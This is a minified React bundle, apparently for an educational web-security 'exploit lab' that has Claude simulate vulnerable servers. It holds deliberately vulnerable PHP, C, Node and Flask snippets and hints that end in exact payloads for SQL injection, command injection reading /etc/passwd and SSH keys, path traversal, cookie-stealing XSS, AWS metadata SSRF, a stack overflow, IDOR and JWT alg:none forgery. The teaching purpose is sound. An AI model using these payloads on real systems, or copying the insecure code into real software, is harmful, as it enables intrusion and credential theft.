${y===s?"el-step-active":""}`,onClick:()=>a(y),children:[i.jsx("span",{className:"el-step-num",children:y+1}),i.jsx("span",{className:"el-step-name",children:w.title})]},w.id))]}),i.jsxs("div",{className:"el-step-detail",children:[i.jsxs("div",{className:"el-step-detail-header",children:[i.jsxs("div",{className:"el-step-detail-title",children:[i.jsxs("span",{className:"el-step-detail-num",children:[s+1,"/",e.steps.length]}),p.title]}),i.jsxs("div",{className:"el-view-toggle",children:[i.jsx("button",{className:`el-view-btn ${r?"":"el-view-active"}`,onClick:()=>o(!1),children:"⚔ Attacker"}),i.jsx("button",{className:`el-view-btn ${r?"el-view-active el-view-defender":""}`,onClick:()=>o(!0),children:"🛡 Defender"})]})]}),r?i.jsx(rv,{dv:p.defenderView}):i.jsxs(i.Fragment,{children:[i.jsx(nv,{step:p}),i.jsx("p",{className:"el-step-desc",children:p.description}),p.code&&i.jsx("pre",{className:"el-code",children:i.jsx("code",{children:p.code})})]}),i.jsxs("div",{className:"el-step-nav",children:[i.jsx("button",{className:"el-btn-ghost",disabled:s===0,onClick:()=>a(w=>w-1),children:"← prev"}),i.jsx("span",{className:"el-step-dots",children:e.steps.map((w,y)=>i.jsx("span",{className:`el-dot ${y===s?"el-dot-on":""}`,onClick:()=>a(y)},y))}),i.jsx("button",{className:"el-btn-ghost",disabled:s===e.steps.length-1,onClick:()=>a(w=>w+1),children:"next →"})]})]})]}),i.jsxs("div",{className:"el-bottom-tabs",children:[i.jsx("div",{className:"el-bottom-tab-bar",children:b.map(w=>i.jsx("button",{className:`el-bottom-tab ${l===w.id?"el-bottom-tab-active":""}`,onClick:()=>c(w.id),children:w.label},w.id))}),i.jsxs("div",{className:"el-bottom-content",children:[l==="overview"&&i.jsxs("div",{className:"el-overview",children:[i.jsxs("div",{className:"el-footer-col",children:[i.jsx("div",{className:"el-footer-label",children:"outcome"}),i.jsx("div",{className:"el-footer-val",children:e.outcome})]}),i.jsxs("div",{className:"el-footer-col",children:[i.jsx("div",{className:"el-footer-label",children:"mitigation"}),i.jsx("div",{className:"el-footer-val",children:e.mitigation})]}),e.pocNote&&i.jsxs("div",{className:"el-footer-col",children:[i.jsx("div",{className:"el-footer-label",children:"PoC / weaponization"}),i.jsx("div",{className:"el-footer-val",children:e.pocNote})]})]}),l==="detection"&&i.jsx(iv,{rules:e.detectionRules}),l==="patch"&&i.jsx(ov,{patch:e.patchAnalysis}),l==="related"&&i.jsx(lv,{cves:e.relatedCVEs,onLaunch:t})]})]})]})}function hv({message:e,onReset:n,onRekey:t}){const s=(e==null?void 0:e.toLowerCase().includes("authentication"))||(e==null?void 0:e.toLowerCase().includes("invalid"))||(e==null?void 0:e.toLowerCase().includes("401"));return i.jsxs("div",{className:"el-error",children:[i.jsx("div",{className:"el-error-icon",children:"⚠"}),i.jsx("div",{className:"el-error-msg",children:e}),s&&i.jsxs("div",{className:"el-error-auth",children:[i.jsx("p",{children:"Your API key may be invalid or expired."}),i.jsx("button",{className:"el-btn-primary",onClick:t,children:"🔑 Re-enter API Key"})]}),i.jsx("button",{className:"el-btn-ghost",onClick:n,children:"Try again"})]})}function cp(){const[e,n]=g.useState("setup"),[t,s]=g.useState(""),[a,r]=g.useState(()=>sessionStorage.getItem(Ia)||""),[o,l]=g.useState(null),[c,d]=g.useState(""),m=async(w,y)=>{var T,f,u;s(w),r(y),n("loading");try{const h=await fetch(Vg,{method:"POST",headers:{"x-api-key":y,"anthropic-version":"2023-06-01","anthropic-dangerous-direct-browser-access":"true","content-type":"application/json"},body:JSON.stringify({model:"claude-sonnet-4-6",max_tokens:7e3,messages:[{role:"user",content:Gg(w)}]})});if(!h.ok){const L=await h.json().catch(()=>({}));throw new Error(((T=L==null?void 0:L.error)==null?void 0:T.message)||`API error ${h.status}`)}const E=(((u=(f=(await h.json()).content)==null?void 0:f[0])==null?void 0:u.text)||"").replace(/^```(?:json)?\n?/,"").replace(/\n?```$/,"").trim();let C;try{C=JSON.parse(E)}catch{throw new Error("Response was cut off mid-JSON (CVE description too long). Try again — it usually succeeds on retry.")}if(!C.steps||!Array.isArray(C.steps))throw new Error("Unexpected response format from Claude.");l(C),n("result")}catch(h){d(h.message||"Something went wrong. Check your API key and try again."),n("error")}},p=()=>{n("setup"),l(null)},v=()=>{sessionStorage.removeItem(Ia),r(""),n("setup"),l(null)},b=w=>{m(w,a)};return i.jsxs("div",{className:"exploit-lab",children:[e==="setup"&&i.jsx(uv,{onSubmit:m}),e==="loading"&&i.jsx(dv,{cveId:t}),e==="result"&&o&&i.jsx(pv,{data:o,onReset:p,onAnalyze:b}),e==="error"&&i.jsx(hv,{message:c,onReset:p,onRekey:v})]})}const mv="https://api.anthropic.com/v1/messages",la="hemos:exploitlab:apikey",$t=[{id:"sqli",name:"SQL Injection",icon:"🗄️",difficulty:"EASY",dc:"#4ade80",target:"login.php — vulnerable-corp.com",objective:"Bypass authentication or dump the users table",hints:["Think about how quotes break out of the SQL string context.","Try adding a single quote ' to see if you get a SQL error.","The pattern ' OR condition -- comments out the rest. What condition is always true?","Try: ' OR '1'='1' --  as the username. The password doesn't matter.","Exact payload: ' OR '1'='1' --  (enter anything for password)"],initialState:{type:"database",tables:{users:[{id:1,username:"admin",password_hash:"5f4dcc3b5aa765d6",role:"ADMIN"},{id:2,username:"alice",password_hash:"0d107d09f5bbe40c",role:"USER"},{id:3,username:"bob",password_hash:"5e884898da280471",role:"USER"}]},currentQuery:"SELECT * FROM users WHERE username=? AND password_hash=?",authenticated:!1,lastResult:null},systemPrompt:`You are a deliberately vulnerable PHP/MySQL login system in an educational security lab. The attacker is learning SQL injection.

Vulnerable PHP:
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "' AND password_hash='" . md5($_POST['password']) . "'";
$result = mysqli_query($conn, $query);
if(mysqli_num_rows($result) > 0) { echo "Welcome " . $row['username']; } else { echo "Login failed."; }

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "What appears on screen to the attacker (login message, error, or dumped rows)",
  "sqlQuery": "The actual SQL string after injection is applied (show the full string with quotes visible)",
  "internalLog": "What the database engine does — 1 sentence, technical",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- newState must preserve the same structure as input state, just update currentQuery, authenticated, lastResult fields
- If auth bypass works, set authenticated: true and lastResult to the matched row(s)
- If UNION or data dump works, put the dumped rows in lastResult
- Set exploitSuccess: true when attacker bypasses auth OR reads data they shouldn't see
- successMessage should say what they achieved
- attackerNote: if exploit worked, return a 1-2 sentence educational note explaining the technique used (for the Attacker Notes panel)`,buildUserMessage:(e,n)=>`State: ${JSON.stringify(e)}
Attacker enters in the username field (password = "test"): ${n}`},{id:"cmdi",name:"Command Injection",icon:"💉",difficulty:"MEDIUM",dc:"#fb923c",target:"Network diagnostics — 10.0.1.5/ping.php",objective:"Inject shell commands. Read /etc/passwd or /root/.ssh/id_rsa",hints:["The server runs your input through a shell command. Think about shell metacharacters.","Shell separators like ; | && || let you chain commands after the ping.","Try: 127.0.0.1; id  to check if command injection works first.","Once you confirm RCE, try: 127.0.0.1 && cat /etc/passwd","Exact payload: 127.0.0.1; cat /etc/passwd  or  127.0.0.1 | cat /root/.ssh/id_rsa"],initialState:{type:"shell",hostname:"prod-web-01",cwd:"/var/www/html",commandHistory:[],lastOutput:"",rootOwned:!1,sensitiveFiles:{"/etc/passwd":`root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
hem:x:1000:1000::/home/hem:/bin/bash
alice:x:1001:1001::/home/alice:/bin/bash`,"/etc/shadow":`root:$6$rounds=5000$saltsalt$H4SHED:18000:0:99999:7:::
hem:$6$rounds=5000$usersalt$H4SHED2:18000:0:99999:7:::`,"/root/.ssh/id_rsa":`-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2aXv8QW3cV...REDACTED FOR SECURITY...
-----END RSA PRIVATE KEY-----`,"/root/flag.txt":"FLAG{c0mm4nd_1nj3ct10n_pwn3d}"}},systemPrompt:`You are a deliberately vulnerable PHP web application on a Linux server in an educational security lab.

Vulnerable PHP (ping.php):
$host = $_POST['host'];
$output = shell_exec("ping -c 4 " . $host);  // no sanitization!
echo "<pre>" . $output . "</pre>";

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "The raw command output the attacker sees in the page",
  "commandExecuted": "The full shell command that ran, with injection applied (show full string)",
  "internalLog": "What the OS executes — 1 sentence, technical",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- If attacker uses ; | && || to chain commands, run ALL chained commands and show all output
- If they try to read a file in sensitiveFiles, include that file's content verbatim in serverResponse
- Update commandHistory by appending the commandExecuted
- Update lastOutput to the serverResponse
- Set exploitSuccess: true if they read any sensitive file or execute commands beyond ping
- If they run "id" or "whoami", return "www-data"
- attackerNote: if exploit worked, return 1-2 sentences explaining the OS command injection technique`,buildUserMessage:(e,n)=>`State: ${JSON.stringify({hostname:e.hostname,commandHistory:e.commandHistory,rootOwned:e.rootOwned})}
Sensitive files (return contents if accessed): ${JSON.stringify(e.sensitiveFiles)}
Attacker submits to host field: ${n}`},{id:"pathtraversal",name:"Path Traversal",icon:"📂",difficulty:"EASY",dc:"#4ade80",target:"File API — api.vulnerable-corp.com/download",objective:"Escape the web root. Read /etc/passwd or find the flag",hints:["The server joins your input to /var/www/uploads/ without sanitization.","../ moves up one directory level. Chain them to climb the filesystem.","Try: ../../../etc/passwd  (each ../ goes up one level from /var/www/uploads/)","From /var/www/uploads, you need 3 levels up to reach /: ../../../etc/passwd","Exact payload: ../../../etc/passwd  or  ../../../root/flag.txt"],initialState:{type:"filesystem",webroot:"/var/www/uploads/",requestedFile:null,resolvedPath:null,inWebroot:!0,lastResponse:null,sensitiveFiles:{"/etc/passwd":`root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
hem:x:1000:1000::/home/hem:/bin/bash`,"/etc/shadow":"root:$6$rounds=5000$saltsalt$H4SHED:18000:0:99999:7:::","/root/.ssh/id_rsa":`-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAK...REDACTED...
-----END RSA PRIVATE KEY-----`,"/root/flag.txt":"FLAG{p4th_tr4v3rs4l_gg_wp}","/var/www/config.php":`<?php
$db_host='localhost';
$db_user='root';
$db_pass='S3cur3P@ssw0rd!';
$db_name='production_db';
?>`},knownFiles:["report_q1.pdf","invoice_2024.pdf","profile_pic.jpg"]},systemPrompt:`You are a deliberately vulnerable file download API in an educational security lab.

Vulnerable PHP (/api/download):
$file = $_GET['file'];  // user input
$path = "/var/www/uploads/" . $file;  // naive join, no sanitization
if(file_exists($path)) { readfile($path); } else { http_response_code(404); echo "Not found"; }

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "The HTTP response body — file contents if found, 404 message if not",
  "resolvedPath": "The actual filesystem path after joining webroot + user input (resolve ../ manually)",
  "inWebroot": true,
  "internalLog": "What PHP does with the path — 1 sentence",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- Resolve path traversal sequences yourself to get the final absolute path
- If resolvedPath matches a key in sensitiveFiles, include its contents in serverResponse
- If resolvedPath is outside /var/www/uploads/, set inWebroot: false
- Set exploitSuccess: true when attacker reads any sensitive file
- Update newState.requestedFile, resolvedPath, inWebroot, lastResponse
- attackerNote: if exploit worked, explain directory traversal technique in 1-2 sentences`,buildUserMessage:(e,n)=>`State: ${JSON.stringify({webroot:e.webroot,requestedFile:e.requestedFile,resolvedPath:e.resolvedPath})}
Sensitive files: ${JSON.stringify(e.sensitiveFiles)}
Attacker sends: GET /api/download?file=${n}`},{id:"xss",name:"Cross-Site Scripting",icon:"🕷️",difficulty:"MEDIUM",dc:"#fb923c",target:"Comment section — blog.vulnerable-corp.com",objective:"Inject a script that pops alert() or steals the admin session cookie",hints:["Comments are rendered as raw HTML — the browser parses everything you post.","HTML tags in your comment will be executed as markup. Try a simple <b>bold</b> first.","Script tags execute JavaScript. Try: <script>alert(1)<\/script>","To steal cookies: <script>alert(document.cookie)<\/script>","img onerror also works if scripts are filtered: <img src=x onerror=alert(document.cookie)>"],initialState:{type:"dom",comments:[{id:1,author:"alice",text:"Great article on security!",ts:"3h ago"},{id:2,author:"bob",text:"Very informative writeup.",ts:"2h ago"}],adminCookie:"session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.REDACTED; Path=/; HttpOnly=false; SameSite=None",xssTriggered:!1,cookieStolen:!1,lastPayload:null},systemPrompt:`You are a deliberately vulnerable PHP blog comment system in an educational security lab. Comments are stored raw and rendered without sanitization.

Vulnerable PHP:
// Store: $comment = $_POST['comment'];  // saved to DB without htmlspecialchars
// Render: echo "<li>" . $row['comment'] . "</li>";  // raw output!

Admin cookie (HttpOnly=false, accessible to JS): eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.REDACTED

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "What the victim's browser renders or executes — describe the visual outcome and any popups/exfil",
  "renderedHtml": "The raw HTML that gets injected into the page (exactly as stored)",
  "internalLog": "What the browser parser does with this HTML — 1 sentence",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- If input contains <script>, onerror=, onload=, or other XSS vectors: set xssTriggered: true
- If the script accesses document.cookie: set cookieStolen: true, include the adminCookie value in serverResponse
- Add the new comment to state.comments array (id, author="attacker", text=input, ts="just now")
- Set exploitSuccess: true if a script executes
- attackerNote: if exploit worked, explain reflected vs stored XSS and the cookie theft technique`,buildUserMessage:(e,n)=>`State: ${JSON.stringify({comments:e.comments,xssTriggered:e.xssTriggered,cookieStolen:e.cookieStolen})}
Admin cookie: ${e.adminCookie}
Attacker posts this comment: ${n}`},{id:"bof",name:"Buffer Overflow",icon:"💾",difficulty:"HARD",dc:"#f87171",target:"auth_service — 10.0.1.10:4444 (32-bit Linux ELF)",objective:"Overflow buf[64] to overwrite the return address and call win()",hints:["The buffer is 64 bytes. Sending more than 64 bytes will overflow into adjacent stack memory.","Try sending 70 'A's. Check what gets overwritten — the saved EBP comes right after the buffer.","The return address is 72 bytes from the start of the buffer (64 buf + 4 EBP + 4 retaddr offset).","win() is at address 0x080484d0. You need to overwrite 72 bytes then place this address.","Exact payload: 72 × 'A' + \\xd0\\x84\\x04\\x08  (little-endian win() address)"],initialState:{type:"memory",bufferSize:64,overflowOffset:72,winAddress:"0x080484d0",currentRetAddr:"0x080484a0",bytesWritten:0,overflowDetected:!1,shellObtained:!1,stack:[{addr:"0xffffcefc",label:"return address",value:"0x080484a0",highlight:!1},{addr:"0xffffcef8",label:"saved EBP",value:"0xffffcef8",highlight:!1},{addr:"0xffffcec0",label:"buf[63]",value:"0x00",highlight:!1},{addr:"0xffffce9c",label:"buf[0]",value:"0x00",highlight:!1}],inputHistory:[]},systemPrompt:`You are a deliberately vulnerable 32-bit Linux auth service in an educational security lab.

Vulnerable C:
void win() { printf("Shell obtained!\\n"); execve("/bin/sh", NULL, NULL); }  // addr: 0x080484d0
void vuln() {
  char buf[64];
  printf("Enter token: ");
  gets(buf);  // no bounds check — stack overflow!
}

Stack layout:
buf[0] @ 0xffffce9c (64 bytes), saved EBP @ 0xffffcedc, return addr @ 0xffffcefc

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "What the program prints (prompt, crash message, or shell)",
  "bytesAnalysis": "How many bytes sent, what they overwrite",
  "internalLog": "CPU/stack behavior — 1 sentence",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- Update bytesWritten to input.length
- If bytesWritten > 64: overflowDetected = true, update stack to show corruption
- If input contains \\xd0\\x84\\x04\\x08 or "win" AND bytesWritten >= 72: shellObtained = true, exploitSuccess = true
- Update stack array values to reflect what bytes were written there
- attackerNote: if exploit worked, explain stack buffer overflows and return address control`,buildUserMessage:(e,n)=>`Stack: ${JSON.stringify(e.stack)}, bufferSize: ${e.bufferSize}, win()@${e.winAddress}, retAddr: ${e.currentRetAddr}
Attacker sends ${n.length} bytes: ${n}`},{id:"ssrf",name:"SSRF",icon:"🌐",difficulty:"MEDIUM",dc:"#fb923c",target:"URL Fetcher — tools.vulnerable-corp.com/fetch",objective:"Access internal services: AWS metadata, Redis, or internal admin panel",hints:["The server fetches URLs on your behalf. Try pointing it at internal addresses.","Cloud instances often expose metadata at 169.254.169.254. Try that IP.","Try: http://169.254.169.254/latest/meta-data/","Internal services often run on localhost. Try: http://127.0.0.1:8080/admin","Exact payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/"],initialState:{type:"network",externalAccess:!0,lastUrl:null,lastResponse:null,internalServices:{"http://169.254.169.254/latest/meta-data/":`ami-id
ami-launch-index
hostname
iam/
instance-id
local-ipv4
public-ipv4
`,"http://169.254.169.254/latest/meta-data/iam/security-credentials/":`AppRole
`,"http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole":'{"Code":"Success","Type":"AWS-HMAC","AccessKeyId":"ASIAIOSFODNN7EXAMPLE","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","Token":"AQoDYXdzEJr...","Expiration":"2026-12-31T00:00:00Z"}',"http://127.0.0.1:8080/admin":"<html><h1>Internal Admin Panel</h1><p>Welcome, internal user. DB: prod-mysql-01</p></html>","http://127.0.0.1:6379/":`-ERR wrong number of arguments for 'get' command
`,"http://internal.corp/api/users":'[{"id":1,"user":"admin","role":"superadmin","secret":"super_secret_token_123"}]'}},systemPrompt:`You are a deliberately vulnerable URL fetching service in an educational security lab.

Vulnerable Python (Flask):
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url, timeout=5)  # no URL validation!
    return response.text

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "The content the server fetched and returned to the attacker",
  "requestMade": "The actual HTTP request the server made (e.g. GET http://169.254.169.254/...)",
  "internalLog": "What the server-side code did — 1 sentence",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- If the URL matches a key in internalServices, return that content as serverResponse
- For partial matches (e.g. url starts with 169.254.169.254), return the closest match
- If the URL is an external site, describe what it would return (but note it's making a server-side request)
- Set exploitSuccess: true if attacker accesses any internal service or metadata endpoint
- Update newState.lastUrl and newState.lastResponse
- attackerNote: if exploit worked, explain SSRF and its impact (credential theft, internal network access)`,buildUserMessage:(e,n)=>`State: ${JSON.stringify({lastUrl:e.lastUrl})}
Internal services available: ${JSON.stringify(Object.keys(e.internalServices))}
Internal service contents: ${JSON.stringify(e.internalServices)}
Attacker submits URL: ${n}`},{id:"idor",name:"IDOR",icon:"🔓",difficulty:"EASY",dc:"#4ade80",target:"User API — api.vulnerable-corp.com/users/{id}",objective:"Access other users' private data by manipulating the user ID",hints:["The API uses your numeric user ID in the URL with no access control check.","You're logged in as user 42. Try accessing user 1 — that's usually the admin.","Try IDs sequentially: 1, 2, 3... Some IDs will have more sensitive data.","User ID 1 is the admin. Try /api/users/1 or change the id parameter to 1.","Exact payload: try id=1, then id=99 (there's a hidden admin user there)"],initialState:{type:"database",currentUserId:42,tables:{users:[{id:1,username:"superadmin",email:"admin@corp.internal",role:"SUPERADMIN",ssn:"REDACTED",salary:"$220,000"},{id:2,username:"alice",email:"alice@corp.com",role:"USER",ssn:"REDACTED",salary:"$95,000"},{id:42,username:"you",email:"you@example.com",role:"USER",ssn:"REDACTED",salary:"$78,000"},{id:99,username:"dbadmin",email:"dba@corp.internal",role:"DBA",ssn:"XXX-XX-7890",salary:"$185,000",dbPassword:"prod_db_p@ss!2024"}]},accessedIds:[],lastAccessed:null},systemPrompt:`You are a deliberately vulnerable REST API with broken object-level authorization in an educational security lab.

Vulnerable Node.js:
app.get('/api/users/:id', authenticateToken, (req, res) => {
  const userId = req.params.id;
  // BUG: no check that userId === req.user.id (the logged-in user)
  db.query('SELECT * FROM users WHERE id = ?', [userId], (err, rows) => {
    res.json(rows[0]);
  });
});

Current logged-in user: ID 42 (username: "you")

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "The JSON API response (the user object returned, or 404)",
  "requestMade": "The HTTP request made, e.g. GET /api/users/1 Authorization: Bearer ...",
  "internalLog": "What the DB query returned — 1 sentence",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- Return the user object for ANY valid id from the users table (no access control check exists)
- For ids not in the table, return a 404
- For id=99 (dbadmin), include the dbPassword field in the response — this is the most sensitive find
- Set exploitSuccess: true if attacker accesses any user other than id=42
- Update accessedIds by appending the accessed id, update lastAccessed
- attackerNote: if exploit worked, explain IDOR (Insecure Direct Object Reference) and why access control must be enforced server-side`,buildUserMessage:(e,n)=>`State: ${JSON.stringify({currentUserId:e.currentUserId,accessedIds:e.accessedIds})}
Users table: ${JSON.stringify(e.tables.users)}
Attacker requests: GET /api/users/${n}`},{id:"jwt",name:"JWT Manipulation",icon:"🎫",difficulty:"HARD",dc:"#f87171",target:"Auth service — api.vulnerable-corp.com",objective:"Forge a JWT to escalate to admin role without the secret key",hints:["JWTs have three parts: header.payload.signature — all base64 encoded.","The 'alg:none' attack: change the algorithm to 'none' and remove the signature.","Decode the JWT, change 'role':'user' to 'role':'admin', re-encode with alg:none.","Try submitting a JWT with header {alg:'none'} and payload {role:'admin'} and no signature.",`Exact: base64('{"alg":"none"}').base64('{"user":"you","role":"admin"}').`],initialState:{type:"dom",comments:[],currentToken:"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",decodedHeader:{alg:"HS256",typ:"JWT"},decodedPayload:{user:"you",role:"user",iat:17e8},adminAccess:!1,cookieStolen:!1,xssTriggered:!1},systemPrompt:`You are a deliberately vulnerable JWT authentication service in an educational security lab.

Vulnerable Node.js:
const token = req.headers.authorization?.split(' ')[1];
const decoded = jwt.decode(token, { complete: true });
// BUG: uses decoded.header.alg instead of enforcing 'HS256'
const verified = jwt.verify(token, SECRET, { algorithms: [decoded.header.alg] });
// This allows alg:none which skips signature verification entirely!
if(verified.role === 'admin') { res.json({ message: 'Admin panel', data: adminData }); }

Valid user token (role: user): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoieW91Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Always respond with ONLY a valid JSON object — no markdown fences, no explanation:
{
  "serverResponse": "What the API returns — access denied, or admin data if forged correctly",
  "tokenAnalysis": "What the server decoded from the submitted token (header + payload)",
  "internalLog": "What the JWT verification does — 1 sentence, technical",
  "newState": {},
  "exploitSuccess": false,
  "successMessage": null,
  "attackerNote": null
}

Rules:
- If the submitted token has alg:none (or alg:None, alg:NONE) AND role:admin in payload: set adminAccess=true, exploitSuccess=true
- If token appears to be the original unmodified token: return "Access denied — user role cannot access admin panel"
- If token has HS256 but wrong signature: return signature verification failed
- For any alg:none token with role:admin, grant access and return admin data: {"users":42,"revenue":"$2.4M","dbHost":"prod-mysql-01.internal","apiKeys":["sk-prod-XXXX","sk-backup-YYYY"]}
- Update newState.adminAccess, decodedHeader, decodedPayload based on what was submitted
- attackerNote: if exploit worked, explain the alg:none JWT attack and why algorithms must be hardcoded server-side`,buildUserMessage:(e,n)=>`Current token for reference: ${e.currentToken}
State: ${JSON.stringify({adminAccess:e.adminAccess,decodedHeader:e.decodedHeader,decodedPayload:e.decodedPayload})}
Attacker submits this JWT (or token): ${n}`}];function fv({state:e}){var t,s;const n=((t=e.tables)==null?void 0:t.users)||[];return i.jsxs("div",{className:"ar-viz ar-viz-db",children:[i.jsxs("div",{className:"ar-viz-header",children:[i.jsx("span",{className:"ar-viz-badge",children:"MySQL"}),i.jsx("span",{className:"ar-viz-title",children:"vulnerable_corp — users"})]}),i.jsx("div",{className:"ar-table-wrap",children:i.jsxs("table",{className:"ar-table",children:[i.jsx("thead",{children:i.jsxs("tr",{children:[i.jsx("th",{children:"id"}),i.jsx("th",{children:"username"}),i.jsx("th",{children:"password_hash"}),i.jsx("th",{children:"role"})]})}),i.jsx("tbody",{children:n.map(a=>{var r;return i.jsxs("tr",{className:e.authenticated&&a.role==="ADMIN"||(r=e.accessedIds)!=null&&r.includes(a.id)?"ar-row-hit":"",children:[i.jsx("td",{children:a.id}),i.jsx("td",{children:a.username}),i.jsx("td",{className:"ar-hash",children:a.password_hash||a.email||"—"}),i.jsx("td",{children:i.jsx("span",{className:`ar-badge-role ${a.role==="ADMIN"||a.role==="SUPERADMIN"||a.role==="DBA"?"ar-admin":""}`,children:a.role})})]},a.id)})})]})}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"LAST QUERY"}),i.jsx("div",{className:"ar-code-block",children:e.currentQuery||"—"})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"ACCESS STATE"}),i.jsx("div",{className:`ar-status ${e.authenticated||((s=e.accessedIds)==null?void 0:s.length)>0?"ar-status-pwned":"ar-status-safe"}`,children:e.authenticated?"⚠ AUTH BYPASSED":e.lastAccessed?`⚠ Accessed user ID ${e.lastAccessed}`:"● No unauthorized access yet"})]})]})}function gv({state:e}){var n;return i.jsxs("div",{className:"ar-viz ar-viz-shell",children:[i.jsxs("div",{className:"ar-viz-header",children:[i.jsx("span",{className:"ar-viz-badge",children:"bash"}),i.jsxs("span",{className:"ar-viz-title",children:[e.hostname," — /var/www/html"]})]}),i.jsxs("div",{className:"ar-file-tree",children:[i.jsx("div",{className:"ar-tree-dir",children:"/var/www/html/"}),["index.php","ping.php","config.php"].map(t=>i.jsxs("div",{className:"ar-tree-file",children:["├── ",t]},t))]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"COMMAND LOG"}),i.jsx("div",{className:"ar-cmd-history",children:(n=e.commandHistory)!=null&&n.length?e.commandHistory.map((t,s)=>i.jsxs("div",{className:"ar-cmd-entry",children:[i.jsxs("span",{className:"ar-cmd-prompt",children:["www-data@",e.hostname,":~$"]}),i.jsxs("span",{className:"ar-cmd-text",children:[" ",t]})]},s)):i.jsx("div",{className:"ar-cmd-empty",children:"No commands executed yet"})})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"SHELL STATUS"}),i.jsx("div",{className:`ar-status ${e.rootOwned?"ar-status-pwned":"ar-status-safe"}`,children:e.rootOwned?"⚠ ROOT SHELL OBTAINED":"● www-data (limited privileges)"})]})]})}function vv({state:e}){const n=e.inWebroot===!1;return i.jsxs("div",{className:"ar-viz ar-viz-fs",children:[i.jsxs("div",{className:"ar-viz-header",children:[i.jsx("span",{className:"ar-viz-badge",children:"VFS"}),i.jsx("span",{className:"ar-viz-title",children:"File Server — /var/www/uploads/"})]}),i.jsxs("div",{className:"ar-path-diagram",children:[i.jsxs("div",{className:"ar-path-row",children:[i.jsx("span",{className:"ar-path-label",children:"WEBROOT"}),i.jsx("span",{className:"ar-path-value",children:"/var/www/uploads/"})]}),i.jsxs("div",{className:"ar-path-row",children:[i.jsx("span",{className:"ar-path-label",children:"REQUEST"}),i.jsx("span",{className:"ar-path-value ar-path-input",children:e.requestedFile||"—"})]}),i.jsxs("div",{className:`ar-path-row ${n?"ar-path-danger":""}`,children:[i.jsx("span",{className:"ar-path-label",children:"RESOLVED"}),i.jsx("span",{className:`ar-path-value ${n?"ar-path-escape":""}`,children:e.resolvedPath||"—"})]})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"AVAILABLE FILES"}),i.jsx("div",{className:"ar-file-tree",children:["report_q1.pdf","invoice_2024.pdf","profile_pic.jpg"].map(t=>i.jsxs("div",{className:"ar-tree-file",children:["├── ",t]},t))})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"BOUNDARY CHECK"}),i.jsx("div",{className:`ar-status ${n?"ar-status-pwned":"ar-status-safe"}`,children:n?"⚠ PATH ESCAPED WEBROOT":e.resolvedPath?"● Within /var/www/uploads/":"● Awaiting request"})]})]})}function yv({state:e}){var n;return i.jsxs("div",{className:"ar-viz ar-viz-dom",children:[i.jsxs("div",{className:"ar-viz-header",children:[i.jsx("span",{className:"ar-viz-badge",children:"DOM"}),i.jsx("span",{className:"ar-viz-title",children:e.currentToken?"JWT Auth Service":"blog.vulnerable-corp.com"})]}),e.currentToken?i.jsxs(i.Fragment,{children:[i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"CURRENT TOKEN (your role: user)"}),i.jsx("div",{className:"ar-code-block",style:{fontSize:"9.5px",wordBreak:"break-all"},children:e.currentToken})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"DECODED HEADER"}),i.jsx("div",{className:"ar-code-block",children:JSON.stringify(e.decodedHeader,null,2)})]}),i.jsxs("div",{className:"ar-viz-section",children:[i.jsx("div",{className:"ar-viz-label",children:"DECODED 